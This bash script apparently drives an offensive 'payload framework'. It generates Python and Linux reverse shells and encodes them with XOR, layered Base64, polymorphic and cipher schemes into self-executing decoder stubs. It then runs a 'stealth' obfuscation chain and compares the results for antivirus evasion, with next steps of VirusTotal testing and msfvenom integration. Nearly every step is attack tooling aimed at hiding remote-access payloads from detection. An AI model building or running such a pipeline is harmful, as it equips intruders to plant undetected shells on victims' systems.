#!/bin/bash
"""
Demo Pipeline - Complete Payload Encoding Workflow
Tests: Generate -> Encode -> Decode -> Execute
"""

echo "🎯 Advanced Payload Framework - Demo Pipeline"
echo "=============================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Create demo directory
mkdir -p demo_output
cd demo_output

echo ""
echo -e "${YELLOW}Step 1: Generate Test Payloads${NC}"
echo "-------------------------------"

# Generate Python reverse shell
echo "[+] Generating Python reverse shell..."
python3 ../payload_gen.py -t python_reverse -h 127.0.0.1 -p 4444 -o python_reverse.py -f python

# Generate Linux shellcode
echo "[+] Generating Linux reverse shellcode..."
python3 ../payload_gen.py -t linux_reverse -h 127.0.0.1 -p 4444 -o linux_reverse.bin

# Create simple test payload
echo "whoami && id && pwd" > simple_command.txt

echo ""
echo -e "${YELLOW}Step 2: Encode Payloads with Different Algorithms${NC}"
echo "------------------------------------------------"

# Test XOR encoding
echo "[+] Testing XOR encoding..."
python3 ../encoder.py -i simple_command.txt -o xor_encoded.txt -e xor --key 0xAA --decoder
echo "    Generated: xor_encoded.txt, xor_encoded_decoder.py"

# Test Base64 encoding
echo "[+] Testing Base64 encoding..."
python3 ../encoder.py -i simple_command.txt -o b64_encoded.txt -e base64 --iterations 3 --decoder
echo "    Generated: b64_encoded.txt, b64_encoded_decoder.py"

# Test Polymorphic encoding
echo "[+] Testing Polymorphic encoding..."
python3 ../encoder.py -i linux_reverse.bin -o poly_encoded.txt -e polymorphic --decoder
echo "    Generated: poly_encoded.txt, poly_encoded_decoder.py"

# Test Caesar cipher
echo "[+] Testing Caesar cipher..."
python3 ../encoder.py -i simple_command.txt -o caesar_encoded.txt -e caesar --shift 7 --decoder
echo "    Generated: caesar_encoded.txt, caesar_encoded_decoder.py"

# Test ROT13
echo "[+] Testing ROT13 encoding..."
python3 ../encoder.py -i simple_command.txt -o rot13_encoded.txt -e rot13 --decoder
echo "    Generated: rot13_encoded.txt, rot13_encoded_decoder.py"

echo ""
echo -e "${YELLOW}Step 3: Test Different Output Formats${NC}"
echo "------------------------------------"

# Generate C# format
echo "[+] Generating C# format..."
python3 ../encoder.py -i linux_reverse.bin -o csharp_payload.cs -e xor --key "secret" --output-format csharp

# Generate Python format
echo "[+] Generating Python format..."
python3 ../encoder.py -i simple_command.txt -o python_payload.py -e base64 --output-format python

echo ""
echo -e "${YELLOW}Step 4: Framework Integration Test${NC}"
echo "--------------------------------"

# Test with original framework
echo "[+] Testing with original obfuscation framework..."
cd ..
python3 main.py --file sample_payloads/basic.txt --chain stealth --target linux --variants 1 > demo_output/framework_output.txt
cd demo_output

echo ""
echo -e "${YELLOW}Step 5: File Analysis${NC}"
echo "-------------------"

echo "Generated files:"
ls -la *.txt *.py *.cs *.bin 2>/dev/null | head -20

echo ""
echo -e "${YELLOW}Step 6: Decoder Testing${NC}"
echo "---------------------"

# Test XOR decoder (safe test)
echo "[+] Testing XOR decoder (dry run)..."
echo "    Command: python3 xor_encoded_decoder.py"
echo "    Note: Decoder will attempt to execute decoded payload"

# Show encoded vs original comparison
echo ""
echo -e "${YELLOW}Step 7: Encoding Comparison${NC}"
echo "-------------------------"

echo "Original payload:"
cat simple_command.txt
echo ""

echo "XOR encoded (hex):"
head -c 100 xor_encoded.txt
echo "..."

echo ""
echo "Base64 encoded:"
head -c 100 b64_encoded.txt
echo "..."

echo ""
echo -e "${YELLOW}Step 8: AV Evasion Analysis${NC}"
echo "-------------------------"

echo "File sizes comparison:"
echo "Original: $(wc -c < simple_command.txt) bytes"
echo "XOR:      $(wc -c < xor_encoded.txt) bytes"
echo "Base64:   $(wc -c < b64_encoded.txt) bytes"
echo "Caesar:   $(wc -c < caesar_encoded.txt) bytes"

echo ""
echo -e "${GREEN}Demo Pipeline Complete!${NC}"
echo "======================="

echo ""
echo "Generated artifacts:"
echo "- Encoded payloads in multiple formats"
echo "- Decoder stubs for each algorithm"
echo "- C# and Python format outputs"
echo "- Framework integration test"

echo ""
echo -e "${BLUE}Next Steps for Real Testing:${NC}"
echo "1. Upload encoded payloads to VirusTotal"
echo "2. Test decoders in isolated VM"
echo "3. Compare detection rates vs raw payloads"
echo "4. Integrate with msfvenom for real shellcode"

echo ""
echo "Demo files saved in: $(pwd)"